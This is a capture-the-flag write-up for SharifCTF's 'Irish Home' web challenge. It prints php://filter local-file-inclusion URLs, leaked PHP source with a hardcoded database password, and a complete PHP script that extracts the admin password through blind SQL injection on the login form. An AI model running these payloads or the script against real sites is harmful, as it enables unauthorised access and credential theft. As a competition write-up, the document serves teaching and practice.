# Irish Home (web 200)

The admin.php page was discovered by a tiny fuzz. admin.php was prone to `Execution after redirect` vulnerability. The admin.php page reaveled show.php which had a parameter named `page`. The show.php had `Local File Inclusion` vulnerability. Source reading:

```
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=delete
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../login
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource=../deleted_3d5d9c1910e7c7/flag
```

delete.php
```
<?php
require_once('header.php');

/*
if(isset($_GET['page'])) {
	$fname = $_GET['page'] . ".php";
	$fpath = "pages/$fname";
	if(file_exists($fpath)) {
		rename($fpath, "deleted_3d5d9c1910e7c7/$fname");
	}
}
*/

?>
<div style="text-align: center;">
<h3 style="color: red;">Site is under maintenance 'til de end av dis f$#!*^% SharifCTF.</h3><br/>
<h4><b>Al' destructive acshuns are disabled!</b></h4>
</div>
<?php
require_once('footer.php');
?>
```
Login.php
```
<?php

session_start();

if (!empty($_SESSION['logged_in']))
	header('Location: /index.php');

require_once('header.php');

$text = "That account doesn't seem to exist";

if($_SERVER['REQUEST_METHOD'] == 'POST') 
{
	if(!empty($_POST['username']) && !empty($_POST['password'])) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strpos($password, '"') !== false)
			$text = "SQL injection detected";
		else {
			$servername = "localhost";
			$db_username = "irish_user";
			$db_password = "3d2f27921e2c13e7b66e7b486b0feae3dde1ef25";
			$dbname = "irish_home";

			$conn = new mysqli($servername, $db_username, $db_password, $dbname);
			if ($conn->connect_error) {
				die("Connection failed: " . $conn->connect_error);
			}

			$sql = "SELECT * FROM users where username=\"$username\" and BINARY password=\"$password\"";

			$result = $conn->query($sql);

			if (!$result)
				trigger_error('Invalid query: ' . $conn->error);

			if ($result->num_rows > 0) {
				if(strpos($username, '"') !== false)
					$text = "SQL injection detected";
				else {
					$_SESSION['logged_in'] = $username;
					header('Location: /admin.php');
				}
			}
			$conn->close();
		}
	}
		echo "<ul class=\"messages\"><li class=\"error\">$text</li></ul>";
}
?>

				<form action="/login.php" method="POST">
					<div class="mdl-textfield mdl-js-textfield">
						<input class="mdl-textfield__input" type="text" id="username" name="username">
						<label class="mdl-textfield__label" for="username">Username</label>
					</div><br/>
					<div class="mdl-textfield mdl-js-textfield">
						<input class="mdl-textfield__input" type="password" id="password" name="password">
						<label class="mdl-textfield__label" for="password">Password</label>
					</div><br/>
					<div style="text-align: center;" class="mdl-textfield mdl-js-textfield">
						<button class="btn waves-effect waves-light" type="submit">Submit</button>
					</div>
				</form>

<?php
require_once('footer.php');
```
deleted_3d5d9c1910e7c7/flag.php
```
<?php

$username = 'Cuchulainn';
$password = ;	// Oi don't save me bleedin password in a shithole loike dis.

$salt = 'd34340968a99292fb5665e';

$tmp = $username . $password . $salt;
$tmp = md5($tmp);

$flag = "SharifCTF{" . $tmp . "}";

echo $flag;
```

Based on flag.php, admin password was required to make flag. In other hand, login.php had `Blind SQL Injection`. Exploit code:

```<?php

function gPrint($message = 'test', $times=1){
        echo '[' . date("d/m/Y H:i:s").'] ' . $message . str_repeat("\n", $times);
}

function NL($times=1){echo str_repeat("\n", $times);}

function printResult($result){
        echo "| " . $result . "\n";
}

function customCurl($URL=null, $postData=false, $cookie=null, $customHeader=null, $proxy=false){

        $cookieJar = './cookie'; //tempnam('/tmp','cookie');
        $ch = curl_init($URL);

        if($cookie==='set'){
                @unlink($cookieJar);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
        }elseif($cookie==='get')
                curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
        else{}

        if($proxy)
                curl_setopt($ch, CURLOPT_PROXY, '127.0.0.1:8080');

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); //don't follow redirects

        if($postData!==false){
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
        }

        if($customHeader!==null){
                curl_setopt($ch, CURLOPT_HTTPHEADER, $customHeader);
        }

        $response = curl_exec($ch);


        list($headers, $body) = explode("\r\n\r\n", $response, 2);
        return array('headers'=>$headers, 'body'=>$body);
}

function getSpecificHeader($headers, $name){
        preg_match("#$name: *(.*)$#", $headers, $matches);

        return $matches[1];
}

function trueOrFalse($response){

        $trueValue = 'detected';
        $falseValue = 'seem to';

        if(strstr($response, $trueValue)!==false)
                return true;
        if(strstr($response, $falseValue)!==false)
                return false;

        return 'unknown';

}

function getChar($pos, $lb=0, $ub=128) {
    $i = 0;
    while(++$i) {
        $M = floor($lb + ($ub-$lb)/2);
        if(injection('<', $pos, $M)==1) {
            $ub = $M - 1;
        }
        else if(injection('>', $pos, $M)==1) {
            $lb = $M + 1;
        }
        else
            return chr($M);
        if($lb > $ub)
            return -1;
    }
}

function injection($condition, $position, $char){
        $baseURL = 'http://ctf.sharif.edu:8082/login.php';

        //echo "Pos: $position, tryin char $condition $char\n";
        //password=admin&username=-1" or (select char_length(password) from users limit 0,1)>31 -- true
        //password=admin&username=-1" or (select char_length(password) from users limit 0,1)>32 -- false
        // length = 32

        $data = 'password=test&username=-1" or ascii(substring((select password from users limit 0,1),' . $position . ',1)) ' . $condition . $char . ' -- ';

        $response = customCurl($baseURL, $data, null, null, true);
        return trueOrFalse($response['body']);
}

$time_start = microtime(true); 
$str = '';
$i = 1;
gPrint('So far: ', 0);
while(true){
        $char = getChar($i);
        if(ord($char)=='0') break;
        $str .= $char;
        echo $char;
        $i++;
}
$time_end = microtime(true);

//dividing with 60 will give the execution time in minutes other wise seconds
$execution_time = ($time_end - $time_start)/60;

//execution time of the script
echo "\n";
gPrint('Task has been finished.');
gPrint('Total Execution Time: '.(int)$execution_time.' Minute(s)');

?>

```
Password gathered: Password: **2a7da9c@088ba43a_9c1b4Xbyd231eb9** and the flag was generated by password easily.


https://twitter.com/yshahinzadeh
